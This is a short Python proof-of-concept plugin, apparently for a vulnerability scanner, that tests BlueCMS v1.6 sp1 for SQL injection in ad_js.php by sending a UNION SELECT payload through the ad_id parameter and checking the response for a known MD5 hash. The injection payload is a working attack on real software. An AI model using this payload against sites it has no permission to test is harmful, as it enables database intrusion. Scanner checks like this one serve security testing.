#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re

"""
POC Name  :  BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞
References:  http://www.myhack58.com/Article/html/3/7/2010/27774_2.htm
Author    :  13
QQ        :  779408317
"""


def assign(service, arg):
    if service == "bluecms":
        return True, arg


def audit(arg):
    payload = "ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('bluecms"', 'http://www.example.com/')[1])